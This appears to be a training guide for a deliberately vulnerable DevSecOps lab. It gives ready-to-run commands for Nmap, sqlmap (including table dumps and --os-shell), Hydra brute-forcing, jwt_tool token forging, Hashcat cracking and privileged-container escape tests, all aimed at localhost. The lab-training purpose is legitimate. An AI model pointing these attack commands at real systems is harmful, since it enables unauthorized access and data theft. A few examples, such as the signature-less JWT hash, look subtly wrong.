# Professional Pentesting Tools Integration

Integration of industry-standard security testing tools with the DevSecOps Hacking Lab environment.

## Overview

Instead of custom scripts, this section demonstrates how to use real-world professional pentesting tools against the lab infrastructure. These are the same tools used by security professionals, bug bounty hunters, and red teams.

## Categories

### 1. Reconnaissance & OSINT
- **Nmap** - Network discovery and service enumeration
- **Masscan** - High-speed port scanner
- **Amass** - Attack surface mapping
- **theHarvester** - OSINT data gathering
- **DNSRecon** - DNS enumeration

### 2. Web Application Testing
- **Burp Suite Professional** - Comprehensive web app security testing
- **OWASP ZAP** - Free automated web app scanner
- **Nikto** - Web server vulnerability scanner
- **WPScan** - WordPress security scanner
- **SQLMap** - Automated SQL injection exploitation

### 3. Authentication & Credential Attacks
- **Hydra** - Network authentication cracker
- **Medusa** - Parallel login brute-forcer
- **John the Ripper** - Password hash cracking
- **Hashcat** - GPU-accelerated password recovery
- **Patator** - Multi-purpose brute-forcer

### 4. API Security Testing
- **Postman** - API testing and automation
- **Insomnia** - REST/GraphQL API client
- **ffuf** - Fast web fuzzer
- **gobuster** - Directory/file/DNS brute-forcing
- **Arjun** - HTTP parameter discovery

### 5. Token/JWT Exploitation
- **jwt_tool** - JWT manipulation and exploitation
- **Keyhacks** - JWT secret brute-forcing
- **JWT Cracker** - Offline JWT secret cracking

### 6. Traffic Analysis & Interception
- **Wireshark** - Network protocol analyzer
- **tcpdump** - Command-line packet analyzer
- **mitmproxy** - Interactive HTTPS proxy
- **Proxychains** - Force traffic through proxy chains

### 7. Vulnerability Scanning
- **Nuclei** - Template-based vulnerability scanner
- **Nessus** - Commercial vulnerability scanner
- **OpenVAS** - Open-source vulnerability scanner
- **Trivy** - Container/IaC security scanner

### 8. Exploitation Frameworks
- **Metasploit** - Comprehensive exploitation framework
- **Cobalt Strike** - Advanced adversary simulation
- **Empire** - Post-exploitation framework
- **Covenant** - .NET C2 framework

### 9. Container Security
- **Docker Bench** - Docker security auditing
- **Anchore** - Container image scanning
- **Clair** - Static analysis for container vulnerabilities
- **Grype** - Container vulnerability scanner

### 10. CI/CD Security
- **GitLeaks** - Secret scanning in git repos
- **TruffleHog** - High entropy string detection
- **Semgrep** - Static code analysis
- **Checkov** - IaC security scanning

## Quick Start Guides

### Burp Suite - Comprehensive Web App Testing

**Target**: API Gateway (http://localhost:8080)

```bash
# 1. Configure browser to use Burp proxy (127.0.0.1:8080)
# 2. Import Burp CA certificate
# 3. Browse to http://localhost:8080

# Key features to use:
# - Proxy: Intercept and modify requests
# - Scanner: Automated vulnerability scanning
# - Repeater: Manual request manipulation
# - Intruder: Automated attack patterns
# - Decoder: Encode/decode JWT tokens
```

**Tests to run**:
- Active scan on /api endpoints
- JWT token manipulation (alg confusion, none algorithm)
- SQL injection on query parameters
- Rate limit bypass (Intruder with pitch fork attack)

### OWASP ZAP - Automated Web App Scanner

**Target**: Full application stack

```bash
# Start ZAP in daemon mode
docker run -u zap -p 8090:8090 -i owasp/zap2docker-stable zap.sh \
  -daemon -host 0.0.0.0 -port 8090 -config api.addrs.addr.name=.* \
  -config api.addrs.addr.regex=true

# Spider the application
curl "http://localhost:8090/JSON/spider/action/scan/?url=http://host.docker.internal:8080"

# Active scan
curl "http://localhost:8090/JSON/ascan/action/scan/?url=http://host.docker.internal:8080"

# Get alerts
curl "http://localhost:8090/JSON/core/view/alerts/"

# Generate HTML report
curl "http://localhost:8090/OTHER/core/other/htmlreport/" > zap_report.html
```

### SQLMap - Automated SQL Injection

**Target**: User Service endpoints (intentionally vulnerable)

```bash
# Test login endpoint
sqlmap -u "http://localhost:8002/users?id=1" \
  --batch --risk=3 --level=5 \
  --technique=BEUSTQ \
  --dbms=postgresql

# Enumerate databases
sqlmap -u "http://localhost:8002/users?id=1" \
  --dbs --batch

# Dump specific table
sqlmap -u "http://localhost:8002/users?id=1" \
  -D userdb -T users --dump --batch

# OS shell (if vulnerable)
sqlmap -u "http://localhost:8002/users?id=1" \
  --os-shell --batch
```

### Hydra - Credential Brute Force

**Target**: Auth Service (http://localhost:8000/auth/login)

```bash
# Create username list
cat > users.txt <<EOF
admin
user
alice
bob
charlie
EOF

# Create password list
cat > passwords.txt <<EOF
admin123
password123
Welcome@2024
qwerty123
EOF

# HTTP POST attack
hydra -L users.txt -P passwords.txt \
  localhost -s 8000 \
  http-post-form "/auth/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -t 4 -V

# With JSON payload
hydra -L users.txt -P passwords.txt \
  localhost -s 8000 \
  http-post-form "/auth/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=401" \
  -t 4 -V
```

### jwt_tool - JWT Manipulation

**Target**: Any JWT token from auth service

```bash
# Install
pip3 install pyjwt

# Clone jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Get token from login
TOKEN=$(curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.challenge_id')

# Decode token
python3 jwt_tool.py $TOKEN

# Test all known exploits
python3 jwt_tool.py $TOKEN -M at -t "http://localhost:8080/api/profile"

# Algorithm confusion attack
python3 jwt_tool.py $TOKEN -X k -pk public.pem

# None algorithm attack
python3 jwt_tool.py $TOKEN -X n

# Brute force secret
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### Nmap - Network Reconnaissance

**Target**: Full docker network

```bash
# Basic service scan
nmap -sV -p 8000,8002,8080,9090,3000,9093,5002,6379 localhost

# Aggressive scan with scripts
nmap -A -sV -sC -p- localhost

# Vulnerability scan
nmap --script vuln -p 8000,8002,8080 localhost

# Docker container scan
nmap -sV -p- 172.17.0.0/24

# Output to XML (for import into Metasploit)
nmap -sV -oX scan_results.xml -p- localhost
```

### ffuf - Fast Web Fuzzer

**Target**: API endpoint discovery

```bash
# Install
go install github.com/ffuf/ffuf@latest

# Fuzz API endpoints
ffuf -w /usr/share/wordlists/api-endpoints.txt \
  -u http://localhost:8080/api/FUZZ \
  -mc 200,201,204,301,302,307,401,403 \
  -c -v

# Fuzz parameters
ffuf -w /usr/share/wordlists/params.txt \
  -u http://localhost:8080/api/profile?FUZZ=1 \
  -mc 200 -c -v

# Fuzz headers
ffuf -w /usr/share/wordlists/headers.txt \
  -u http://localhost:8080/api/profile \
  -H "FUZZ: test" \
  -mc 200 -c -v

# Rate limit bypass with multiple IPs
ffuf -w ips.txt:IP -w users.txt:USER \
  -u http://localhost:8080/api/FUZZ \
  -H "X-Forwarded-For: IP" \
  -mc 200 -c -v
```

### Nuclei - Template-based Vulnerability Scanner

**Target**: All services

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Scan for common vulnerabilities
nuclei -u http://localhost:8080 -t cves/ -t vulnerabilities/

# Scan for misconfigurations
nuclei -u http://localhost:8080 -t misconfiguration/

# Scan for exposed panels
nuclei -u http://localhost:8080 -t exposures/

# Custom severity filter
nuclei -u http://localhost:8080 -severity critical,high

# Output to JSON
nuclei -u http://localhost:8080 -json -o nuclei_results.json
```

### Metasploit - Exploitation Framework

**Target**: Vulnerable services

```bash
# Start msfconsole
msfconsole

# Search for modules
search jwt
search docker
search api

# Example: JWT exploitation
use auxiliary/scanner/http/jwt_secret_scanner
set RHOSTS localhost
set RPORT 8080
set TARGETURI /api/profile
set JWT_TOKEN <token>
run

# Example: Brute force
use auxiliary/scanner/http/http_login
set RHOSTS localhost
set RPORT 8000
set TARGETURI /auth/login
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Hashcat - GPU Password Cracking

**Target**: JWT secret cracking

```bash
# Extract JWT secret (if leaked hash available)
# Example: HS256 JWT

# Create JWT hash file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9" > jwt.txt

# Crack with wordlist
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Brute force (8 chars, lowercase + digits)
hashcat -m 16500 jwt.txt -a 3 ?l?l?l?l?l?l?l?l

# Show cracked
hashcat -m 16500 jwt.txt --show
```

### GitLeaks - Secret Scanning

**Target**: Project repository

```bash
# Install
brew install gitleaks

# Scan current repo
gitleaks detect --source . --verbose

# Scan with report
gitleaks detect --source . --report-path gitleaks-report.json

# Scan specific commit range
gitleaks detect --source . --log-opts="--since=2024-01-01"

# Pre-commit hook (prevent secrets from being committed)
gitleaks protect --staged --verbose
```

### Docker Bench Security

**Target**: Docker infrastructure

```bash
# Clone
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security

# Run audit
sudo sh docker-bench-security.sh

# Output to JSON
sudo sh docker-bench-security.sh -l audit.log -c check_1,check_2
```

### Trivy - Container Vulnerability Scanner

**Target**: All Docker images

```bash
# Install
brew install aquasecurity/trivy/trivy

# Scan images
trivy image login-api:latest
trivy image api-gateway:latest
trivy image user-service:latest

# Scan with severity filter
trivy image --severity HIGH,CRITICAL login-api:latest

# Scan filesystem (IaC)
trivy fs --security-checks vuln,config .

# Output to JSON
trivy image -f json -o trivy-results.json login-api:latest
```

## Integration with CI/CD

### GitHub Actions Workflow

```yaml
name: Security Scan

on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Secret scanning
      - name: GitLeaks
        uses: gitleaks/gitleaks-action@v2

      # SAST
      - name: Semgrep
        uses: returntocorp/semgrep-action@v1

      # Container scanning
      - name: Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'login-api:latest'
          severity: 'CRITICAL,HIGH'

      # IaC scanning
      - name: Checkov
        uses: bridgecrewio/checkov-action@master
        with:
          directory: infrastructure/

      # Dependency scanning
      - name: OWASP Dependency-Check
        uses: dependency-check/Dependency-Check_Action@main
```

## Tool Comparison Matrix

| Tool | Category | Cost | Learning Curve | Best For |
|------|----------|------|----------------|----------|
| Burp Suite Pro | Web App | $$$$ | Medium | Comprehensive web testing |
| OWASP ZAP | Web App | Free | Low | Automated scanning |
| SQLMap | Database | Free | Low | SQL injection |
| Hydra | Auth | Free | Low | Credential brute force |
| jwt_tool | Token | Free | Low | JWT exploitation |
| Nmap | Network | Free | Low | Network discovery |
| Metasploit | Exploitation | Free | High | Full engagement |
| Nuclei | Vuln Scan | Free | Low | Template-based scanning |
| Hashcat | Password | Free | Medium | GPU password cracking |
| Cobalt Strike | C2 | $$$$ | High | Red team operations |

## Recommended Workflow

### Phase 1: Reconnaissance
1. **Nmap** - Port and service discovery
2. **Amass** - Subdomain enumeration
3. **Nuclei** - Quick vulnerability scan

### Phase 2: Enumeration
1. **ffuf** - API endpoint discovery
2. **Burp Suite** - Detailed request analysis
3. **Arjun** - Parameter discovery

### Phase 3: Vulnerability Testing
1. **SQLMap** - SQL injection
2. **jwt_tool** - JWT exploitation
3. **OWASP ZAP** - Active scanning

### Phase 4: Exploitation
1. **Metasploit** - Exploit known vulnerabilities
2. **Hydra** - Credential attacks
3. **Hashcat** - Password cracking

### Phase 5: Reporting
1. **Burp Suite** - HTML report
2. **Nuclei** - JSON output
3. **OWASP ZAP** - PDF report

## Lab-Specific Attack Scenarios

### Scenario 1: Full Stack Penetration Test

```bash
# 1. Reconnaissance
nmap -sV -p- localhost > nmap_scan.txt

# 2. Web fuzzing
ffuf -w wordlist.txt -u http://localhost:8080/api/FUZZ

# 3. JWT exploitation
python3 jwt_tool.py $TOKEN -M at -t "http://localhost:8080/api/profile"

# 4. SQL injection
sqlmap -u "http://localhost:8002/users?id=1" --batch --dbs

# 5. Credential stuffing
hydra -L users.txt -P passwords.txt localhost -s 8000 http-post-form

# 6. Container scanning
trivy image login-api:latest --severity HIGH,CRITICAL

# 7. Generate report
nuclei -u http://localhost:8080 -json -o report.json
```

### Scenario 2: JWT Token Exploitation Chain

```bash
# 1. Obtain token
TOKEN=$(curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.challenge_id')

# 2. Analyze token
python3 jwt_tool.py $TOKEN

# 3. Algorithm confusion
python3 jwt_tool.py $TOKEN -X k

# 4. None algorithm
python3 jwt_tool.py $TOKEN -X n

# 5. Brute force secret
python3 jwt_tool.py $TOKEN -C -d rockyou.txt

# 6. Claims tampering
python3 jwt_tool.py $TOKEN -I -pc role -pv admin

# 7. Use forged token
curl http://localhost:8080/api/admin \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

### Scenario 3: Container Security Audit

```bash
# 1. Docker bench security
sh docker-bench-security.sh > docker_audit.txt

# 2. Image vulnerability scan
trivy image login-api:latest
trivy image api-gateway:latest
trivy image user-service:latest

# 3. IaC scanning
checkov -d infrastructure/

# 4. Secret detection
gitleaks detect --source .

# 5. Network segmentation check
nmap -sV 172.17.0.0/24

# 6. Container escape testing
docker run --rm -it --privileged login-api:latest /bin/bash
```

## Resources

### Tool Documentation
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [OWASP ZAP User Guide](https://www.zaproxy.org/docs/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists) - Comprehensive wordlists
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Attack payloads
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb) - Fuzzing patterns

### Training
- HackTheBox
- TryHackMe
- PentesterLab
- PortSwigger Web Security Academy
